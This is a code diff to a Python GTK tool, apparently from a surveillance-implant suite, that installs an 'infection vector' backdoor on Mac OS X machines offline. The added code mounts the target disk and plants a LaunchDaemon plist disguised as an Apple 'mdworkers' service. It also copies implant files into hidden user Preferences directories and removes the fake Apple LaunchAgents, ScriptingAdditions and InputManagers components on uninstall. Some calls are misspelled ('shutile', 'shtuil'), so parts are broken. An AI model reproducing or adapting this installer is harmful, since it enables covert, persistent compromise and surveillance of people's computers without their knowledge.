@@ -6,6 +6,7 @@ import subprocess
 import sys
 import signal
 import os
+import shutil
 import time
 import json
 
@@ -292,6 +293,7 @@ class OfflineInstall(object):
 			if i[0] == 'os x' and i[3] == '/':
 				tableosx.update({'rootdisk': i[1]})
 				tableosx.update({'rootfs': i[2]})
+				tableosx.update({'rootfsrw': 'ufsd'})
 				tableosx.update({'rootmount': i[3]})
 				break
 
@@ -708,6 +710,7 @@ class OfflineInstall(object):
 					print("  Found: /dev/" + i)
 
 					fs = ['iso9660', 'vfat', 'msdos', 'hfsplus', 'ext4', 'reiserfs', 'ext3', 'ext2', 'xfs', 'jfs']
+					devfs = None
 
 					for j in fs:
 						try:
@@ -716,6 +719,7 @@ class OfflineInstall(object):
 							continue
 
 						print("  Found: /dev/" + i + " -> " + j)
+						devfs = j
 						break
 
 					if os.path.exists("/mnt/RCSPE/") == True and os.path.exists("/mnt/RCSPE/RCS.ini") == True and \
@@ -739,6 +743,7 @@ class OfflineInstall(object):
 							print("  Found: Linux license")
 
 						self.backconf.update({'dev': '/dev/' + i})
+						self.backconf.update({'devfs': devfs})
 
 						for line in open("/mnt/RCSPE/RCS.ini").readlines():
 							if line.find("[RCS]") != -1:
@@ -1170,21 +1175,163 @@ class OfflineInstall(object):
 	# Install the infection vector on Mac OS X system with the backdoor of the user
 	##
 	def install_osx_backdoor(self, user):
+		print("    Try to install the backdoor for " + user + " on Mac OS X system...")
+
 		#
 		# TODO: infettare l'user
 		##
 
-		print("    Install [OK] -> " + user + " on Mac OS X system...")
+		try:
+			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tabosx['rootfsrw'], self.tabosx['rootdisk']), shell=True)
+		except:
+			print("      Install [ERROR] -> " + user + " on Mac OS X system!")
+			return False
+
+		home = None
+
+		for i in self.useosx:
+			if i['username'] == user:
+				if i['status'] == True or i['status'] == False:
+					try:
+						ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
+					except:
+						pass
+
+					print("      Install [ERROR] -> " + user + " on Mac OS X system!")
+					return False
+
+				home = i['home']
+				break
+
+		#
+		# hdir con un '_' indica la directory temporanea dove vengono droppati i file per l'installazione
+		##			
+		temp_backdoor_path = "/mnt" + home + "/Library/Preferences/" + self.backconf['hdir'] + "_"
+		temporary_loader = "4872364829"
+		mdworker_plist_content =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" \
+					  "<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" \
+					  "<plist version=\"1.0\">\n" \
+					  "<dict>\n" \
+					  "<key>Label</key>\n" \
+					  "<string>com.apple.mdworkers." + user + "</string>\n" \
+					  "<key>ProgramArguments</key>\n" \
+					  "<array>\n" \
+					  "<string>" + home + "/Library/Preferences/" + self.backconf['hdir'] + "_/" + temporary_loader + "</string>\n" \
+					  "<string>" + user +"</string>\n" \
+					  "<string>" + self.backconf['hdir'] +"</string>\n" \
+					  "<string>" + self.backconf['hcore'] +"</string>\n" \
+					  "</array>\n" \
+					  "<key>KeepAlive</key>\n" \
+					  "<dict>\n" \
+					  "<key>SuccessfulExit</key>\n" \
+					  "<false/>\n" \
+					  "</dict>\n" \
+					  "</dict>\n" \
+					  "</plist>"
+		plist_path = "/mnt/System/Library/LaunchDaemons/com.apple.mdworkers." + user + ".plist"
+
+		#
+		# Crea la directory temporanea
+		##
+		try:
+			os.mkdir(temp_backdoor_path)
+		except:
+			pass
+
+		#
+		# Crea l'mdworker per il primo avvio
+		##
+		source_path = "/mnt/private/etc/authorization"
+		dest_path = "/mnt/private/etc/authorization.bu"
+		shutil.copyfile(source_path, dest_path)
+
+		dest_path = "/mnt/private/etc/authorization.mod"
+		os.rename(source_path, dest_path)
+			
+		hfile = open(dest_path, "w")
+		hfile.truncate()
+		hfile.write(mdworker_plist_content)
+		hfile.close()
+
+		dest_path = "/mnt/private/etc/authorization"
+		source_path = "/mnt/private/etc/authorization.bu"
+		shutile.copyfile(source_path, dest_path)
+		os.remove(source_path)
+
+		source_path = "/mnt/private/etc/authorization.mod"
+		os.rename(source_path, plist_path)
+
+		#
+		# Crea un marker nella directory temporanea
+		##
+		plist_path = temp_backdoor_path + "/00"
+		hfile = open(plist_path, "w")
+		hfile.write("00")
+		hfile.close()
+
+		try:
+			os.mkdir("/mnt2")
+		except:
+			pass
+
+		print("Searching backdoor configuration files in the device...")
+
+		try:
+			ret = subprocess.check_output("mount -t {} /dev/{} /mnt2/ 2> /dev/null".format(self.backconf['devfs'], self.backconf['dev']), shell=True)
+		except:
+			try:
+				ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
+			except:
+				pass
+
+			print("      Install [ERROR] -> " + user + " on Mac OS X system!")
+			return False
+
+		#
+		# Copia i file nella directory temporanea
+		##
+		files_path = "/mnt2/RCSPE/files/OSX"
+		files = os.listdir(files_path)
+
+		for hfind in files:
+			tmp_path = files_path + "/" + hfind
+			tmp_path2 = temp_backdoor_path + "/" + hfind
+			shutile.copyfile(tmp_path, tmp_path2)
+
+		try:
+			ret = subprocess.check_output("umount /mnt2/ 2> /dev/null", shell=True)
+		except:
+			try:
+				ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
+			except:
+				pass
+
+			print("      Install [ERROR] -> " + user + " on Mac OS X system!")
+			return False
+
+		os.remove("/mnt2")
+
+		try:
+			ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
+		except:
+			print("      Install [ERROR] -> " + user + " on Mac OS X system!")
+			return False
+
+		print("      Install [OK] -> " + user + " on Mac OS X system!")
+		return True
 
 	#
 	# Install the infection vector on Linux system with the backdoor of the user
 	##
 	def install_linux_backdoor(self, user):
+		print("    Try to install the backdoor for " + user + " on Linux system...")
+
 		#
 		# TODO: infettare l'user
 		##
 
-		print("    Install [OK] -> " + user + " on Linux system...")
+		print("      Install [OK] -> " + user + " on Linux system!")
+		return True
 
 	#
 	# Install the infection vector with the backdoor of the user or users selected
@@ -1195,18 +1342,48 @@ class OfflineInstall(object):
 		model, rows = self.builder.get_object("treeview-selection1").get_selected_rows()
 
 		if len(rows) != 0:
+			dialog = self.builder.get_object("messagedialog3")
+			msgdia = ""
+
+			if len(rows) == 1:
+				msgdia = "Are you sure you want to install for this user?"
+			else:
+				msgdia = "Are you sure you want to install for " + str(len(rows)) + " users?"
+
+			dialog.format_secondary_text(msgdia)
+			response = dialog.run()
+			if response == Gtk.ResponseType.NO:
+				dialog.hide()
+				return
+			elif response == Gtk.ResponseType.YES:
+				dialog.hide()
+
 			for row in rows:
 				iter = model.get_iter(row)
 				user = model.get_value(iter, 1)
 
 				print("  Selected: " + user)
 
+				ret = False
+
 				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
-					self.install_osx_backdoor(user)
+					ret = self.install_osx_backdoor(user)
 				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
-					self.install_linux_backdoor(user)
+					ret = self.install_linux_backdoor(user)
 				else:
 					print("    Install [PASS] -> " + user + " on Unknown system.")
+
+				if ret == False:
+					dialog = self.builder.get_object("messagedialog4")
+					msgdia = "Installation failed for " + user + " user."
+				else:
+					dialog = self.builder.get_object("messagedialog5")
+					msgdia = "Installation successful for " + user + " user!"
+
+				dialog.format_secondary_text(msgdia)
+				response = dialog.run()
+				if response == Gtk.ResponseType.OK:
+					dialog.hide()
 
 			print("")
 			self.check_statususers()
@@ -1216,21 +1393,112 @@ class OfflineInstall(object):
 	# Uninstall the infection vector on Mac OS X system with the backdoor of the user
 	##
 	def uninstall_osx_backdoor(self, user):
+		print("    Try to uninstall the backdoor for " + user + " on Mac OS X system...")
+
 		#
 		# TODO: disinfettare l'user
 		##
 
-		print("    Uninstall [OK] -> " + user + " on Mac OS X system...")
+		try:
+			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tabosx['rootfsrw'], self.tabosx['rootdisk']), shell=True)
+		except:
+			print("      Uninstall [ERROR] -> " + user + " on Mac OS X system!")
+			return False
+
+		home = None
+
+		for i in self.useosx:
+			if i['username'] == user:
+				if i['status'] == None:
+					try:
+						ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
+					except:
+						pass
+
+					print("      Uninstall [ERROR] -> " + user + " on Mac OS X system!")
+					return False
+
+				home = i['home']
+				break
+
+		#
+		# Cancella la directory temporanea (nel caso la backdoor non abbia mai runnato)
+		##
+		backdoor_path = "/mnt" + home + "/Library/Preferences/" + self.backconf['hdir'] + "_"
+		shutil.rmtree(backdoor_path)
+
+		#
+		# Cancella il plist del primo avvio (se la bacdkoor non ha mai runnato)
+		##
+		backdoor_path = "/mnt/System/Library/LaunchDaemons/com.apple.mdworkers." + user + ".plist"
+		os.remove(backdoor_path)
+
+		#
+		# Cancella il plist della backdoor
+		##
+		backdoor_path = "/mnt" + home + "/Library/LaunchAgents/com.apple.mdworker.plist"
+		os.remove(backdoor_path)
+
+		#
+		# Cancella il plist della backdoor
+		##
+		backdoor_path = "/mnt" + home + "/Library/LaunchAgents/com.apple.UIServerLogin.plist"
+		os.remove(backdoor_path)
+
+		#
+		# Cancella tutti i file e la directory
+		##
+		backdoor_path = "/mnt" + home + "/Library/Preferences/ " + self.backconf['hdir']
+		if os.path.exists(backdoor_path) == True: 
+			shutil.rmtree(backdoor_path)
+		else:
+			backdoor_path += ".app"
+			shutil.rmtree(backdoor_path)
+
+		#
+		# Conta quanti utenti ci sono con la backdoor installata
+		##
+		status = False
+
+		for i in self.useosx:
+			if i['status'] == True or i['status'] == False:
+				status = True	
+				break
+
+		if status == False:
+			#
+			# Rimuove l'input manager quando si toglie l'ultima istanza della backdoor
+			##
+			backdoor_path = "/mnt/Library/ScriptingAdditions/appleOsax"
+			shutil.rmtree(backdoor_path)
+
+			backdoor_path = "/mnt/Library/ScriptingAdditions/UIServerEvents"
+			shutil.rmtree(backdoor_path)
+
+			backdoor_path = "/mnt/Library/InputManagers/appleHID"
+			shtuil.rmtree(backdoor_path)
+
+		try:
+			ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
+		except:
+			print("      Uninstall [ERROR] -> " + user + " on Mac OS X system!")
+			return False
+
+		print("      Uninstall [OK] -> " + user + " on Mac OS X system!")
+		return True
 
 	#
 	# Uninstall the infection vector on Linux system with the backdoor of the user
 	##
 	def uninstall_linux_backdoor(self, user):
+		print("    Try to uninstall the backdoor for " + user + " on Linux system...")
+
 		#
 		# TODO: disinfettare l'user
 		##
 
-		print("    Uninstall [OK] -> " + user + " on Linux system...")
+		print("      Uninstall [OK] -> " + user + " on Linux system!")
+		return True
 
 	#
 	# Uninstall the infection vector with backdoor of the user or users selected
@@ -1241,18 +1509,48 @@ class OfflineInstall(object):
 		model, rows = self.builder.get_object("treeview-selection1").get_selected_rows()
 
 		if len(rows) != 0:
+			dialog = self.builder.get_object("messagedialog6")
+			msgdia = ""
+
+			if len(rows) == 1:
+				msgdia = "Are you sure you want to uninstall for this user?"
+			else:
+				msgdia = "Are you sure you want to uninstall for " + str(len(rows)) + " users?"
+
+			dialog.format_secondary_text(msgdia)
+			response = dialog.run()
+			if response == Gtk.ResponseType.NO:
+				dialog.hide()
+				return
+			elif response == Gtk.ResponseType.YES:
+				dialog.hide()
+
 			for row in rows:
 				iter = model.get_iter(row)
 				user = model.get_value(iter, 1)
 
 				print("  Selected: " + user)
 
+				ret = False
+
 				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
-					self.uninstall_osx_backdoor(user)
+					ret = self.uninstall_osx_backdoor(user)
 				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
-					self.uninstall_linux_backdoor(user)
+					ret = self.uninstall_linux_backdoor(user)
 				else:
 					print("    Uninstall [PASS] -> " + user + " on Unknown system.")
+
+				if ret == False:
+					dialog = self.builder.get_object("messagedialog7")
+					msgdia = "Uninstallation failed for " + user + " user."
+				else:
+					dialog = self.builder.get_object("messagedialog8")
+					msgdia = "Uninstallation successful for " + user + " user!"
+
+				dialog.format_secondary_text(msgdia)
+				response = dialog.run()
+				if response == Gtk.ResponseType.OK:
+					dialog.hide()
 
 			print("")
 			self.check_statususers()
@@ -1261,44 +1559,80 @@ class OfflineInstall(object):
 	#
 	# Export logs of the infection vector on Mac OS X system with backdoor of the user
 	##
-	def export_osx_log(self, user):
+	def export_osx_logs(self, user):
+		print("    Try to export logs for " + user + " on Mac OS X system...")
+
 		#
 		# TODO: esportare log dell'user
 		##
 
-		print("    Export log [OK] -> " + user + " on Mac OS X system...")
+		print("      Export logs [OK] -> " + user + " on Mac OS X system!")
+		return True
 
 	#
 	# Export logs of the infection vector on Linux system with backdoor of the user
 	##
-	def export_linux_log(self, user):
+	def export_linux_logs(self, user):
+		print("    Try to export logs for " + user + " on Linux system...")
+
 		#
 		# TODO: esportare log dell'user
 		##
 
-		print("    Export log [OK] -> " + user + " on Linux system...")
+		print("      Export logs [OK] -> " + user + " on Linux system!")
+		return True
 
 	#
 	# Export logs of the infection vector with backdoor of the user or users selected
 	##
-	def export_log(self, *args):
-		print("Export log action...")
+	def export_logs(self, *args):
+		print("Export logs action...")
 
 		model, rows = self.builder.get_object("treeview-selection1").get_selected_rows()
 
 		if len(rows) != 0:
+			dialog = self.builder.get_object("messagedialog9")
+			msgdia = ""
+
+			if len(rows) == 1:
+				msgdia = "Are you sure you want to export logs for this user?"
+			else:
+				msgdia = "Are you sure you want to export logs for " + str(len(rows)) + " users?"
+
+			dialog.format_secondary_text(msgdia)
+			response = dialog.run()
+			if response == Gtk.ResponseType.NO:
+				dialog.hide()
+				return
+			elif response == Gtk.ResponseType.YES:
+				dialog.hide()
+
 			for row in rows:
 				iter = model.get_iter(row)
 				user = model.get_value(iter, 1)
 
 				print("  Selected: " + user)
 
+				ret = False
+
 				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
-					self.export_osx_log(user)
+					ret = self.export_osx_logs(user)
 				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
-					self.export_linux_log(user)
+					ret = self.export_linux_logs(user)
 				else:
-					print("    Export log [PASS] -> " + user + " on Unknown system.")
+					print("    Export logs [PASS] -> " + user + " on Unknown system.")
+
+				if ret == False:
+					dialog = self.builder.get_object("messagedialog10")
+					msgdia = "Export failed for " + user + " user."
+				else:
+					dialog = self.builder.get_object("messagedialog11")
+					msgdia = "Export successful for " + user + " user!"
+
+				dialog.format_secondary_text(msgdia)
+				response = dialog.run()
+				if response == Gtk.ResponseType.OK:
+					dialog.hide()
 
 			print("")
 			self.check_statususers()
@@ -1308,21 +1642,27 @@ class OfflineInstall(object):
 	# Dump files of the infection vector on Mac OS X system with backdoor of the user
 	##
 	def dump_osx_files(self, user):
+		print("    Try to dump files for " + user + " on Mac OS X system...")
+
 		#
 		# TODO: dump files dell'user
 		##
 
-		print("    Dump files [OK] -> " + user + " on Mac OS X system...")
+		print("      Dump files [OK] -> " + user + " on Mac OS X system!")
+		return True
 
 	#
 	# Dump files of the infection vector on Linux system with backdoor of the user
 	##
 	def dump_linux_files(self, user):
+		print("    Try to dump files for " + user + " on Linux system...")
+
 		#
 		# TODO: dump files dell'user
 		##
 
-		print("    Dump files [OK] -> " + user + " on Linux system...")
+		print("      Dump files [OK] -> " + user + " on Linux system!")
+		return True
 
 	#
 	# Dump files of the infection vector with backdoor of the user or users selected
@@ -1333,18 +1673,48 @@ class OfflineInstall(object):
 		model, rows = self.builder.get_object("treeview-selection1").get_selected_rows()
 
 		if len(rows) != 0:
+			dialog = self.builder.get_object("messagedialog12")
+			msgdia = ""
+
+			if len(rows) == 1:
+				msgdia = "Are you sure you want to dump files for this user?"
+			else:
+				msgdia = "Are you sure you want to dump files for " + str(len(rows)) + " users?"
+
+			dialog.format_secondary_text(msgdia)
+			response = dialog.run()
+			if response == Gtk.ResponseType.NO:
+				dialog.hide()
+				return
+			elif response == Gtk.ResponseType.YES:
+				dialog.hide()
+
 			for row in rows:
 				iter = model.get_iter(row)
 				user = model.get_value(iter, 1)
 
 				print("  Selected: " + user)
 
+				ret = False
+
 				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
-					self.dump_osx_files(user)
+					ret = self.dump_osx_files(user)
 				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
-					self.dump_linux_files(user)
+					ret = self.dump_linux_files(user)
 				else:
 					print("    Dump files [PASS] -> " + user + " on Unknown system.")
+
+				if ret == False:
+					dialog = self.builder.get_object("messagedialog13")
+					msgdia = "Dump failed for " + user + " user."
+				else:
+					dialog = self.builder.get_object("messagedialog14")
+					msgdia = "Dump successful for " + user + " user!"
+
+				dialog.format_secondary_text(msgdia)
+				response = dialog.run()
+				if response == Gtk.ResponseType.OK:
+					dialog.hide()
 
 			print("")
 			self.check_statususers()
